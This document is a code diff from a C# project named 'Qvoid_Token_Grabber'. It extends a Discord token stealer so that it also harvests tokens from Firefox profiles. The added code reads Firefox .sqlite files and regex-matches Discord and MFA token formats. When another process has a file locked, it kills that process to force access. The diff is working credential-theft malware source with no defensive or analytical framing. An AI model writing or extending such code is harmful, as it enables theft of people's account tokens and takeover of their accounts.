@@ -636,7 +636,7 @@ namespace Qvoid_Token_Grabber.Discord
             TokensLocation.Add(roaming + "\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb");
             TokensLocation.Add(roaming + "\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb");
             TokensLocation.Add(roaming + "\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb");
-
+            TokensLocation.Add(roaming + "\\Mozilla\\Firefox\\Profiles");
 
             List<string> tokens = new List<string>();
 
@@ -644,6 +644,64 @@ namespace Qvoid_Token_Grabber.Discord
             {
                 if (!Directory.Exists(tokenPath))
                     continue;
+
+                if (tokenPath == roaming + "\\Mozilla\\Firefox\\Profiles")
+                {
+                    //FireFox needs to be threat in special way ;(
+                    foreach (var directory in Directory.GetDirectories(roaming + "\\Mozilla\\Firefox\\Profiles"))
+                    {
+                        var files = Directory.GetFiles(directory);
+                        foreach (var file in files)
+                        {
+                            while (true)
+                            {
+                                if (!file.EndsWith(".sqlite"))
+                                    break;
+
+                                try
+                                {
+                                    string fileContent = "";
+
+                                    //Because there might be some issues reading the tokens files such as locked or already used by some process, we trying to bypass it.
+                                    using (FileStream fs = new FileStream(file, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
+                                    using (StreamReader sr = new StreamReader(fs))
+                                        fileContent = sr.ReadToEnd();
+
+                                    MatchCollection matches = Regex.Matches(fileContent, @"[\w-]{24}\.[\w-]{6}\.[\w-]{27}");
+                                    MatchCollection mfaMatches = Regex.Matches(fileContent, @"mfa\.[\w-]{84}");
+
+                                    foreach (Match match in matches)
+                                        if (IsValidToken(match.Value))
+                                            tokens.Add(match.Value);
+
+                                    foreach (Match match in mfaMatches)
+                                        if (IsValidToken(match.Value))
+                                            tokens.Add(match.Value);
+
+                                    break;
+                                }
+                                catch (Exception)
+                                {
+                                    foreach (var locker in QvoidWrapper.ProcessHandler.WhoIsLocking(file))
+                                    {
+                                        try
+                                        {
+                                            if (locker.MainModule.FileName == DiscordExe)
+                                                continue;
+                                        }
+                                        catch (Exception)
+                                        { }
+
+                                        try { locker.Kill(); }
+                                        catch { break; }
+                                    }
+                                }
+                            }
+                        }
+                    }
+
+                    continue;
+                }
 
                 foreach (string filePath in Directory.GetFiles(tokenPath))
                 {
